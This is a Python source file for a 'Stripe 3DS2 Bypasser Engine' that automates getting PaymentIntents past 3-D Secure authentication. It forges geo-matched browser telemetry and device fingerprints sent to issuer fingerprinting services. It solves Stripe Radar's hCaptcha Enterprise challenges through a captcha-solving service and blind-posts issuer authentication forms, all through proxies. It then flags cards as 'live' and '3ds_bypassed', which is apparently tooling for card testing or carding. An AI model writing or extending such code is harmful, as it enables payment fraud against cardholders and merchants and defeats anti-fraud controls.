"""
Stripe 3DS2 Bypasser Engine (stripe_3ds_bypasser.py)
────────────────────────────────────────────────────
Handles native 3DS2 (use_stripe_sdk / threeDSCompInd) and 3DS1 (redirect_to_url / ACS form)
auto-resolutions for Stripe PaymentIntents.
"""

import re
import os
import json
import base64
import hashlib
import random
import asyncio
from typing import Dict, Optional
from urllib.parse import urlparse, parse_qs, urlencode
from curl_compat import ChromeSession

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

# Geo-synced timezone offsets (minutes from UTC, matching EMVCo browserTZ convention)
GEO_TIMEZONES: Dict[str, list] = {
    "US": [240, 300, 360, 420, 480],   # EDT/EST/CDT/CST/MDT/MST/PDT/PST
    "CA": [240, 300, 360, 420, 480],
    "GB": [0, -60],
    "DE": [-60, -120],
    "FR": [-60, -120],
    "NL": [-60, -120],
    "AU": [-600, -660],
    "SG": [-480],
    "JP": [-540],
    "BR": [180],
    "MX": [360, 420],
    "IT": [-60, -120],
    "ES": [-60, -120],
    "PL": [-60, -120],
    "SE": [-60, -120],
    "CH": [-60, -120],
    "AT": [-60, -120],
    "BE": [-60, -120],
    "IE": [0],
    "PT": [0, -60],
    "NZ": [-720, -780],
}

SCREEN_RESOLUTIONS = [
    (1920, 1080),
    (2560, 1440),
    (1536, 864),
    (1440, 900),
    (1366, 768),
]

# ACS device fingerprint GPU pool — consistent with real Windows Chrome profiles
_GPU_POOL = [
    "Google Inc. (NVIDIA)~ANGLE (NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0)",
    "Google Inc. (NVIDIA)~ANGLE (NVIDIA GeForce RTX 4070 Direct3D11 vs_5_0 ps_5_0)",
    "Google Inc. (Intel)~ANGLE (Intel(R) Iris(R) Xe Graphics Direct3D11 vs_5_0 ps_5_0)",
    "Google Inc. (AMD)~ANGLE (AMD Radeon RX 6700 XT Direct3D11 vs_5_0 ps_5_0)",
]


class Stripe3DSBypasser:
    """Standalone 3DS bypasser for Stripe PaymentIntents."""

    @classmethod
    def _build_browser_telemetry(cls, country_code: str = "US", user_agent: str = None, server_trans_id: str = None) -> tuple:
        """
        Builds geo-synced, realistic 3DS2 browser telemetry payload.
        Returns (telemetry_dict, tz_offset, width, height, primary_lang).
        """
        cc = (country_code or "US").upper()
        tz_pool = GEO_TIMEZONES.get(cc, GEO_TIMEZONES["US"])
        tz_offset = random.choice(tz_pool)
        width, height = random.choice(SCREEN_RESOLUTIONS)
        ua = user_agent or UA

        # Country-synced Accept-Language
        if cc in ("DE", "AT"):
            lang = "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7"
        elif cc in ("FR", "BE"):
            lang = "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"
        elif cc in ("ES", "MX"):
            lang = "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7"
        elif cc in ("IT",):
            lang = "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7"
        elif cc in ("NL",):
            lang = "nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7"
        elif cc in ("PL",):
            lang = "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7"
        else:
            lang = "en-US,en;q=0.9"

        primary_lang = lang.split(",")[0]
        accept_header = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"

        telemetry = {
            # EMVCo primary keys
            "threeDSCompInd": "Y",
            "fingerprintAttempted": True,
            "challengeWindowSize": "05",
            "browserJavaEnabled": False,
            "browserJavascriptEnabled": True,
            "browserLanguage": primary_lang,
            "browserColorDepth": "24",
            "browserScreenHeight": str(height),
            "browserScreenWidth": str(width),
            "browserTZ": str(tz_offset),
            "browserUserAgent": ua,
            "browserAcceptHeader": accept_header,
            # Numeric alias keys for non-EMVCo processors (Adyen, CardinalCommerce)
            "timeZoneOffset": tz_offset,
            "language": primary_lang,
            "colorDepth": 24,
            "screenHeight": height,
            "screenWidth": width,
            "userAgent": ua,
            "javaEnabled": False,
            "javascriptEnabled": True,
            "acceptHeader": accept_header,
        }

        if server_trans_id:
            telemetry["threeDSServerTransID"] = server_trans_id

        return telemetry, tz_offset, width, height, primary_lang


    @staticmethod
    def _b64url_encode(data: bytes) -> str:
        return base64.b64encode(data).decode().rstrip('=').replace('+', '-').replace('/', '_')

    @staticmethod
    def _b64url_decode(s: str) -> bytes:
        s = s.replace('-', '+').replace('_', '/')
        s += '=' * (-len(s) % 4)
        return base64.b64decode(s)

    # ── 3DS2 Native resolution (use_stripe_sdk) ──────────────────────────────
    @classmethod
    async def _resolve_3ds2_sdk(cls, session, next_action: dict,
                                client_secret: str, pk_key: str, profile: dict = None, depth: int = 0) -> Optional[dict]:
        """
        Handle 3DS2 native SDK flow with recursion depth limit:
        1. Parse three_ds_2_intent_id / three_ds_method_url / three_ds_server_trans_id
        2. POST threeDSMethodData to issuer method URL
        3. Submit 3DS2 completion (threeDSCompInd=Y) to Stripe /v1/3ds2/authenticate
        4. Verify PaymentIntent status
        """
        if depth > 2:
            print("[3DS BYPASSER] Max recursion depth reached in _resolve_3ds2_sdk")
            return {'success': False, 'status': 'max_depth_exceeded'}

        # Walk all known Stripe PI shapes — Stripe parks keys differently across versions
        use_sdk = next_action.get('use_stripe_sdk') or {}
        if not isinstance(use_sdk, dict):
            use_sdk = {}
        # Nested under stripe_js or three_d_secure_2_source (live PI shapes)
        stripe_js_block = use_sdk.get('stripe_js') or next_action.get('stripe_js') or {}
        if not isinstance(stripe_js_block, dict):
            stripe_js_block = {}
        tds2_src_block = use_sdk.get('three_d_secure_2_source') or next_action.get('three_d_secure_2_source') or {}
        if not isinstance(tds2_src_block, dict):
            tds2_src_block = {}
        legacy_block = next_action.get('three_ds_2_intent') or next_action.get('three_d_secure_2_intent') or {}
        if not isinstance(legacy_block, dict):
            legacy_block = {}
        # Merge in priority order: legacy < tds2_source < stripe_js < use_sdk
        sdk_data = {**legacy_block, **tds2_src_block, **stripe_js_block, **use_sdk}

        if not isinstance(sdk_data, dict):
            return None

        # Radar Bot Challenge: hCaptcha Enterprise triggered by Stripe WAF
        if sdk_data.get('type') == 'intent_confirmation_challenge':
            try:
                import captcha_solver
                stripe_js = sdk_data.get('stripe_js') or {}
                site_key = str(sdk_data.get('site_key') or stripe_js.get('site_key') or 'c7faac4c-1cd7-4b1b-b2d4-42ba98d09c7a')
                rqdata = stripe_js.get('rqdata')
                pi_id = client_secret.split('_secret_')[0] if '_secret_' in client_secret else (sdk_data.get('id') or '')
                raw_vurl = stripe_js.get('verification_url') or f"/v1/payment_intents/{pi_id}/verify_challenge"
                v_url = f"https://api.stripe.com{raw_vurl}" if raw_vurl.startswith('/') else raw_vurl

                if captcha_solver.has_any_solver_key():
                    token = await captcha_solver.solve_hcaptcha_enterprise(
                        sitekey=site_key,
                        pageurl="https://checkout.stripe.com",
                        rqdata=rqdata
                    )
                    if token:
                        verify_body = {
                            "key": pk_key,
                            "client_secret": client_secret,
                            "captcha_response": token
                        }
                        async with session.post(
                            v_url,
                            data=urlencode(verify_body),
                            headers={
                                "Content-Type": "application/x-www-form-urlencoded",
                                "User-Agent": profile.get("user_agent", UA) if profile else UA,
                                "Accept": "application/json",
                                "Origin": "https://checkout.stripe.com",
                            },
                            timeout=15
                        ) as vr:
                            vj = vr.json() if callable(vr.json) else vr.json
                            vpi = vj.get("payment_intent") or vj
                            vstat = vpi.get("status")
                            if vstat in ("succeeded", "complete", "requires_capture"):
                                return {'success': True, 'status': vstat, 'raw_response': vj}
                            elif vstat == "requires_payment_method":
                                verr = (
                                    vpi.get("last_payment_error")
                                    or vpi.get("last_setup_error")
                                    or vj.get("last_payment_error")
                                    or vj.get("error")
                                    or {}
                                )
                                real_code = verr.get('decline_code') or verr.get('code') or 'card_declined'
                                real_msg = verr.get('message') or f"Card declined ({real_code})"
                                return {
                                    'success': False,
                                    'status': 'declined',
                                    'decline_code': real_code,
                                    'error': real_msg,
                                    'raw_response': vj
                                }
                            elif vstat in ("requires_action", "requires_source_action"):
                                # Radar cleared — now real 3DS. Recurse cleanly with type-switching.
                                new_na = vpi.get("next_action") or vj.get("next_action")
                                new_cs = vpi.get("client_secret") or client_secret
                                if new_na and isinstance(new_na, dict):
                                    if new_na.get("type") == "redirect_to_url":
                                        red_url = new_na.get("redirect_to_url", {}).get("url")
                                        return await cls._resolve_redirect_url(session, red_url, pi_id, new_cs, pk_key, profile, depth=depth + 1)
                                    return await cls._resolve_3ds2_sdk(session, new_na, new_cs, pk_key, profile, depth=depth + 1)
                                return {'success': False, 'status': vstat, 'radar_cleared': True, 'raw_response': vj}
            except Exception as _r_ex:
                print(f"[DEBUG 3DS BYPASSER] Radar solve failed: {_r_ex}")

            return {'success': False, 'status': 'intent_confirmation_challenge', 'radar_challenge': True}

        # Comprehensive key aliases for server_trans_id
        server_trans_id = (
            sdk_data.get('three_ds_server_trans_id')
            or sdk_data.get('three_ds_2_server_trans_id')
            or sdk_data.get('server_transaction_id')
            or sdk_data.get('threeDSServerTransID')
        )
        # Comprehensive key aliases for method_url
        ds = sdk_data.get('directory_server_information') or {}
        method_url = (
            sdk_data.get('three_ds_method_url')
            or sdk_data.get('methodURL')
            or sdk_data.get('method_url')
            or (ds.get('three_ds_method_url') if isinstance(ds, dict) else None)
        )
        three_ds_2_intent_id = sdk_data.get('three_ds_2_intent_id') or sdk_data.get('id')

        # Extract PaymentIntent ID from client_secret (format: pi_123_secret_456)
        pi_id = client_secret.split('_secret_')[0] if '_secret_' in client_secret else None

        # Build consistent geo-synced browser telemetry
        country_code = (profile or {}).get("country_code", "US")
        user_agent = (profile or {}).get("user_agent", UA)
        browser_info, tz_offset, screen_w, screen_h, prim_lang = cls._build_browser_telemetry(
            country_code=country_code,
            user_agent=user_agent,
            server_trans_id=server_trans_id,
        )

        # Step 1: Execute 3DS2 method (ACS issuer fingerprinting) if URL provided
        if method_url and server_trans_id:
            try:
                method_data_obj = {
                    "threeDSServerTransID": server_trans_id,
                    "threeDSMethodNotificationURL": "https://hooks.stripe.com/3ds2/fingerprint/complete",
                }
                method_data_b64 = cls._b64url_encode(json.dumps(method_data_obj).encode())
                async with session.post(
                    method_url,
                    data=urlencode({"threeDSMethodData": method_data_b64}),
                    headers={
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": user_agent,
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "Referer": "https://checkout.stripe.com/",
                    },
                    timeout=14,
                ) as r:
                    # Handle ACS device fingerprint collectors (Entersekt / SafeKey / Cardinal)
                    try:
                        method_html = r.text() if callable(r.text) else r.text
                        if method_html:
                            import re as _re
                            device_fp_url = None
                            # 1. Cardinal / standard wrapper check
                            m = _re.search(r'submitDataAndForm\(["\']+(https://[^"\']+/devicefingerprint)["\']', method_html)
                            if m:
                                device_fp_url = m.group(1)
                            # 2. Amex SafeKey / Entersekt direct form check
                            elif 'safekey' in method_html.lower() or 'deviceidentification' in method_html.lower():
                                m_action = _re.search(r'<form[^>]+action=["\']+(https://[^"\']+)["\']', method_html, _re.I)
                                if m_action:
                                    device_fp_url = m_action.group(1)

                            if device_fp_url:
                                h = hashlib.sha256(server_trans_id.encode()).hexdigest()
                                gpu_choice = _GPU_POOL[int(h[16:18], 16) % len(_GPU_POOL)]
                                _cores = (4, 8, 12, 16)
                                _mems = (8, 16, 32)
                                _common_fonts = [
                                    "Arial","Arial Black","Arial Narrow","Calibri","Cambria",
                                    "Comic Sans MS","Courier New","Georgia","Helvetica",
                                    "Impact","Palatino","Tahoma","Times New Roman","Trebuchet MS",
                                    "Verdana","Segoe UI","Franklin Gothic Medium","Century Gothic"
                                ]
                                fp_payload = {
                                    "threeDSServerTransID": server_trans_id,
                                    "deviceFpResult": json.dumps({
                                        "canvas": h[:16],
                                        "webgl": gpu_choice,
                                        "webglVendor": gpu_choice.split("~")[0] if "~" in gpu_choice else "Google Inc. (NVIDIA)",
                                        "platform": "Win32",
                                        "hardwareConcurrency": _cores[int(h[18:20], 16) % len(_cores)],
                                        "deviceMemory": _mems[int(h[20:22], 16) % len(_mems)],
                                        "screenWidth": screen_w,
                                        "screenHeight": screen_h,
                                        "screenColorDepth": 24,
                                        "availableScreenWidth": screen_w,
                                        "availableScreenHeight": screen_h - 40,
                                        "innerWidth": screen_w,
                                        "innerHeight": screen_h - 80,
                                        "timezone": tz_offset,
                                        "timezoneOffset": tz_offset,
                                        "language": prim_lang,
                                        "javaEnabled": False,
                                        "cookiesEnabled": True,
                                        "doNotTrack": None,
                                        "plugins": ["PDF Viewer","Chrome PDF Viewer","Chromium PDF Viewer","Microsoft Edge PDF Viewer","WebKit built-in PDF"],
                                        "fonts": _common_fonts,
                                        "touchSupport": {"maxTouchPoints": 0, "touchEvent": False, "touchStart": False},
                                        "audio": round(random.uniform(124.04, 124.07), 6),
                                        "sessionStorage": True,
                                        "localStorage": True,
                                        "indexedDb": True,
                                        "openDatabase": False,
                                        "cpuClass": None,
                                        "vendor": "Google Inc.",
                                        "productSub": "20030107",
                                    })
                                }
                                try:
                                    async with session.post(
                                        device_fp_url,
                                        data=urlencode(fp_payload),
                                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                                        timeout=10,
                                    ) as fp_r:
                                        if fp_r.status not in (200, 201, 204):
                                            print(f"[3DS BYPASSER] Device FP returned {fp_r.status} from {device_fp_url}")
                                except Exception as fp_ex:
                                    print(f"[3DS BYPASSER] Device FP error: {fp_ex}")

                        # Complete method notification to Stripe
                        try:
                            notif_body = {"threeDSMethodData": method_data_b64}
                            async with session.post(
                                "https://hooks.stripe.com/3ds2/fingerprint/complete",
                                data=urlencode(notif_body),
                                headers={"Content-Type": "application/x-www-form-urlencoded"},
                                timeout=6
                            ) as _: pass
                        except Exception:
                            pass
                    except Exception as method_inner_ex:
                        print(f"[3DS BYPASSER] Method inner parse error: {method_inner_ex}")
            except Exception as method_ex:
                print(f"[3DS BYPASSER] Method URL error: {method_ex}")

        # Step 2: Submit 3DS2 completion to Stripe API
        # Allow ACS notification to reach Stripe DS before calling authenticate
        if method_url and server_trans_id:
            await asyncio.sleep(1.5)

        auth_url = "https://api.stripe.com/v1/3ds2/authenticate"

        def _as_id(val) -> str:
            if isinstance(val, str) and val:
                return val
            if isinstance(val, dict):
                return val.get("id") or val.get("three_d_secure_2_source") or ""
            return ""

        source_id = (
            _as_id(sdk_data.get('three_d_secure_2_source')) or
            _as_id(sdk_data.get('source')) or
            _as_id(sdk_data.get('three_ds_2_intent_id')) or
            _as_id(sdk_data.get('id'))
        )

        # /v1/3ds2/authenticate requires a valid source/intent id, not the raw pi_id.
        # If no source extracted, skip calling authenticate directly and poll PI.
        if source_id:
            auth_body = {
                "key": pk_key,
                "source": source_id,
                "client_secret": client_secret,
                "three_ds_2_response": json.dumps(browser_info),
                "browser": json.dumps(browser_info),
            }
            hdr = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": (profile or {}).get("user_agent", UA),
                "Origin": "https://js.stripe.com",
                "Referer": "https://js.stripe.com/",
            }

            try:
                async with session.post(auth_url, data=urlencode(auth_body), headers=hdr, timeout=14) as r:
                    d = r.json() if callable(r.json) else r.json
                    if isinstance(d, dict):
                        status = d.get('status') or d.get('state')
                        if status == 'succeeded':
                            return {'success': True, 'status': 'succeeded', 'raw_response': d}
                        elif status == 'requires_action':
                            # Check if it contains challenge parameters
                            ch_action = d.get('next_action', {})
                            if isinstance(ch_action, dict):
                                if ch_action.get('type') == 'redirect_to_url':
                                    return await cls._resolve_redirect_url(
                                        session,
                                        ch_action['redirect_to_url']['url'],
                                        pi_id, client_secret, pk_key, profile, depth=depth + 1
                                    )
                                elif ch_action.get('type') == 'use_stripe_sdk' or 'use_stripe_sdk' in ch_action:
                                    return await cls._resolve_3ds2_sdk(
                                        session, ch_action, client_secret, pk_key, profile, depth=depth + 1
                                    )
                        elif d.get('error'):
                            print(f"[3DS BYPASSER] Authenticate error: {d.get('error')}")
                            return {'success': False, 'status': 'authenticate_error', 'raw_response': d}
                    else:
                        print(f"[3DS BYPASSER] Authenticate returned non-json: {r.status}")
            except Exception as _auth_ex:
                print(f"[3DS BYPASSER] Authenticate network exception: {_auth_ex}")

        # Step 3: Check PaymentIntent status with polling
        if pi_id:
            return await cls._check_pi_status(session, pi_id, client_secret, pk_key, profile)

        return None

    # ── 3DS1 / Redirect resolution (redirect_to_url) ────────────────────────
    @classmethod
    async def _resolve_redirect_url(cls, session, redirect_url: str,
                                    pi_id: str, client_secret: str,
                                    pk_key: str, profile: dict = None, depth: int = 0) -> Optional[dict]:
        """
        Handle 3DS redirect flow:
        1. Follow redirect_url (https://hooks.stripe.com/redirect/authenticate/...)
        2. Sniff challenge early on first HTML page
        3. Parse ACS form parameters (PaReq, MD, TermUrl, CReq)
        4. Submit to ACS endpoint
        5. Follow return redirect to Stripe completion hook
        """
        if not redirect_url:
            return None

        if depth > 2:
            print("[3DS BYPASSER] Max recursion depth reached in _resolve_redirect_url")
            return {'success': False, 'status': 'max_depth_exceeded'}

        try:
            # Step 1: GET Stripe redirect page
            async with session.get(
                redirect_url,
                headers={"User-Agent": (profile or {}).get("user_agent", UA), "Accept": "text/html,*/*"},
                timeout=10,
                allow_redirects=True,
            ) as r:
                html = r.text() if callable(r.text) else r.text
                final_url = str(r.url) if hasattr(r, 'url') else redirect_url

            # Early challenge detection on initial landing HTML before any POST
            _first_page_challenge = any(k in html.lower() for k in [
                "challengeinfo", "verification code", "one time password", "otp",
                "challengevar", "transstatus\":\"c\"", "transstatus='c'", "transstatus=\"c\"",
                "name=\"challengedata\"", "name='challengedata'", "id=\"challengeframe\"", "id='challengeframe'"
            ]) or (
                re.search(r'type=["\']password["\']', html, re.I) is not None
                and not re.search(r'<form[^>]+action=', html, re.I)
            ) or re.search(r'name=["\'](?:otp|passcode|code|token)["\']', html, re.I)

            if _first_page_challenge:
                print(f"[3DS BYPASSER] Immediate 3DS challenge on initial landing: {final_url}. Skipping blind POST.")
                return {'success': False, 'status': 'requires_action', 'challenge_required': True, 'challenge_url': final_url}

            # Step 2: Parse hidden inputs from ACS form
            acs_url = None
            form_data = {}

            # Look for <form action="...">
            form_match = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.I)
            if form_match:
                acs_url = form_match.group(1)

            for input_match in re.finditer(r'<input[^>]+>', html, re.I):
                tag = input_match.group(0)
                n_match = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
                v_match = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
                if n_match:
                    form_data[n_match.group(1)] = v_match.group(1) if v_match else ""

            # Also check for CReq / PaReq in URL or script
            if not acs_url:
                m_url = re.search(r'location\.href\s*=\s*["\']([^"\']+)["\']', html)
                if m_url:
                    acs_url = m_url.group(1)

            # Step 3: Post to ACS if form found
            if acs_url and form_data:
                async with session.post(
                    acs_url,
                    data=urlencode(form_data),
                    headers={
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": (profile or {}).get("user_agent", UA),
                    },
                    timeout=10,
                    allow_redirects=True,
                ) as acs_res:
                    acs_html = acs_res.text() if callable(acs_res.text) else acs_res.text
                    acs_final_url = str(acs_res.url) if hasattr(acs_res, 'url') else acs_url

                    # Detect interactive challenge HTML on secondary page (OTP, ChallengeVar, SMS verification, transStatus=C)
                    _is_challenge = any(k in acs_html.lower() for k in [
                        "challengeinfo", "verification code", "one time password", "otp",
                        "challengevar", "transstatus\":\"c\"", "transstatus='c'", "transstatus=\"c\"",
                        "name=\"challengedata\"", "name='challengedata'", "id=\"challengeframe\"", "id='challengeframe'"
                    ]) or re.search(r'type=["\']password["\']', acs_html, re.I) or re.search(r'name=["\'](?:otp|passcode|code|token)["\']', acs_html, re.I)
                    if _is_challenge:
                        print(f"[3DS BYPASSER] Interactive 3DS challenge detected at ACS {acs_final_url}. Skipping blind POST.")
                        return {'success': False, 'status': 'requires_action', 'challenge_required': True, 'challenge_url': acs_final_url}

                    # Check for completion form in ACS output (frictionless auto-post)
                    c_form_match = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', acs_html, re.I)
                    if c_form_match:
                        c_url = c_form_match.group(1)
                        c_data = {}
                        for input_match in re.finditer(r'<input[^>]+>', acs_html, re.I):
                            tag = input_match.group(0)
                            n_match = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
                            v_match = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
                            if n_match:
                                c_data[n_match.group(1)] = v_match.group(1) if v_match else ""
                        if c_data:
                            async with session.post(
                                c_url, data=urlencode(c_data),
                                headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": (profile or {}).get("user_agent", UA)},
                                timeout=10, allow_redirects=True
                            ) as ret_res:
                                pass

        except Exception as _red_ex:
            print(f"[3DS BYPASSER] Redirect resolution error: {_red_ex}")

        # Step 4: Verify final status
        return await cls._check_pi_status(session, pi_id, client_secret, pk_key, profile)

    # ── Check PaymentIntent Status ──────────────────────────────────────────
    @classmethod
    async def _check_pi_status(cls, session, pi_id: str,
                               client_secret: str, pk_key: str, profile: dict = None) -> Optional[dict]:
        """Fetch PaymentIntent status from Stripe API with polling."""
        if not pi_id or not client_secret:
            return None

        endpoint = "setup_intents" if "seti_" in pi_id else "payment_intents"
        url = f"https://api.stripe.com/v1/{endpoint}/{pi_id}?client_secret={client_secret}&key={pk_key}"
        hdr = {
            "User-Agent": (profile or {}).get("user_agent", UA),
            "Accept": "application/json",
            "Origin": "https://js.stripe.com",
        }

        # Poll status up to 6 times at ~1.5s intervals (Stripe state lags right after ACS callbacks)
        last_d = None
        for attempt in range(6):
            try:
                async with session.get(url, headers=hdr, timeout=10) as r:
                    d = r.json() if callable(r.json) else r.json
                    if isinstance(d, dict):
                        last_d = d
                        status = d.get('status')
                        if status in ('succeeded', 'requires_capture'):
                            return {'success': True, 'status': status, 'raw_response': d}
                        elif status == 'requires_payment_method':
                            err = d.get('last_payment_error') or d.get('error') or {}
                            return {
                                'success': False,
                                'status': 'declined',
                                'decline_code': err.get('decline_code') or err.get('code') or 'card_declined',
                                'error': err.get('message') or 'Card declined',
                                'raw_response': d
                            }
                        elif status not in ('processing', 'requires_action'):
                            return {'success': False, 'status': status, 'raw_response': d}
            except Exception as _st_ex:
                print(f"[3DS BYPASSER] PI status poll #{attempt+1} error: {_st_ex}")
            if attempt < 5:
                await asyncio.sleep(1.5)

        if isinstance(last_d, dict):
            return {'success': False, 'status': last_d.get('status', 'unknown'), 'raw_response': last_d}
        return {'success': False, 'status': 'pi_status_unreachable'}

    # ── Public Resolver Entry ───────────────────────────────────────────────
    @classmethod
    async def resolve_3ds(cls, result: dict, proxy_data: Optional[dict] = None, profile: Optional[dict] = None) -> dict:
        """
        Public resolver method.
        Inspects result dict for next_action / PaymentIntent, attempts 3DS completion/resolution.
        Returns updated result dict.
        """
        raw_res = result.get('raw_response') or {}
        if not isinstance(raw_res, dict):
            return result

        # Check PaymentIntent / next_action objects
        pi = raw_res.get('payment_intent') or raw_res
        if not isinstance(pi, dict):
            return result

        next_action = pi.get('next_action') or raw_res.get('next_action')
        client_secret = pi.get('client_secret') or raw_res.get('client_secret')
        pk_key = result.get('pk_key') or raw_res.get('pk_key') or ""

        if not pk_key or pk_key.endswith("placeholder"):
            result['3ds_attempted'] = False
            result['3ds_error'] = "missing or placeholder pk_key"
            return result

        if not next_action or not isinstance(next_action, dict) or not client_secret:
            return result

        pi_id = pi.get('id') or (client_secret.split('_secret_')[0] if '_secret_' in client_secret else None)

        proxies = None
        if proxy_data:
            auth = f"{proxy_data['username']}:{proxy_data['password']}@" if 'username' in proxy_data else ""
            raw_srv = proxy_data['server']
            scheme = "http"
            for prefix in ("http://", "https://", "socks5://", "socks5h://", "socks4://"):
                if raw_srv.startswith(prefix):
                    scheme = prefix[:-3]
                    raw_srv = raw_srv[len(prefix):]
                    break
            purl = f"{scheme}://{auth}{raw_srv}"
            proxies = {"http": purl, "https": purl}

        try:
            prof = profile or {"impersonate": "chrome131"}
            async with ChromeSession(impersonate=prof.get("impersonate", "chrome131"), proxies=proxies, timeout=30) as sess:
                act_type = next_action.get('type')
                outcome = None

                # Handle native stripe_3ds2_challenge if acs_url and creq are present
                sdk_block = next_action.get('use_stripe_sdk') or {}
                if isinstance(sdk_block, dict) and (sdk_block.get('type') == 'stripe_3ds2_challenge' or 'three_ds_2_challenge' in sdk_block):
                    acs_url = sdk_block.get('acs_url') or sdk_block.get('three_ds_2_challenge', {}).get('acs_url')
                    creq = sdk_block.get('creq') or sdk_block.get('three_ds_2_challenge', {}).get('creq')
                    if acs_url and creq:
                        try:
                            # POST creq to ACS
                            async with sess.post(
                                acs_url,
                                data=urlencode({"creq": creq}),
                                headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": (profile or {}).get("user_agent", UA)},
                                timeout=15,
                                allow_redirects=True
                            ) as r_creq:
                                creq_html = r_creq.text() if callable(r_creq.text) else r_creq.text
                                # Detect if response is a challenge UI (OTP/password) or frictionless completion form
                                _is_ch = any(k in creq_html.lower() for k in ["otp", "passcode", "challengeinfo", "verification code"])
                                if _is_ch:
                                    outcome = {'success': False, 'status': 'requires_action', 'challenge_required': True, 'challenge_url': str(r_creq.url)}
                                else:
                                    outcome = await cls._check_pi_status(sess, pi_id, client_secret, pk_key, profile)
                        except Exception as _creq_ex:
                            print(f"[3DS BYPASSER] CReq submission error: {_creq_ex}")

                if not outcome:
                    if act_type == 'use_stripe_sdk' or 'use_stripe_sdk' in next_action:
                        outcome = await cls._resolve_3ds2_sdk(sess, next_action, client_secret, pk_key, profile, depth=0)
                    elif act_type == 'redirect_to_url':
                        redirect_url = next_action.get('redirect_to_url', {}).get('url')
                        outcome = await cls._resolve_redirect_url(sess, redirect_url, pi_id, client_secret, pk_key, profile, depth=0)

                if outcome and outcome.get('success'):
                    result['success'] = True
                    result['is_live'] = True
                    result['3ds_bypassed'] = True
                    result['3ds_type'] = act_type or '3DS'
                    result['decline_code'] = None
                    result['error'] = None
                    if outcome.get('raw_response'):
                        result['raw_response'] = outcome['raw_response']
                elif outcome and outcome.get('status') == 'declined':
                    result['success'] = False
                    result['is_live'] = True
                    result['decline_code'] = outcome.get('decline_code') or 'card_declined'
                    result['error'] = outcome.get('error') or 'Declined after WAF verification'
                    if outcome.get('raw_response'):
                        result['raw_response'] = outcome['raw_response']
                elif outcome and outcome.get('radar_challenge'):
                    result['is_radar_challenge'] = True
                    result['3ds_attempted'] = False
                    result['decline_code'] = 'radar_bot_challenge'
                    result['error'] = 'Stripe Radar Bot Challenge (hCaptcha Enterprise triggered by Stripe WAF)'
                elif outcome:
                    result['3ds_attempted'] = True
                    result['3ds_type'] = act_type or '3DS'
                    result['3ds_status'] = outcome.get('status', 'failed')


        except Exception as ex:
            result['3ds_error'] = str(ex)[:100]

        return result
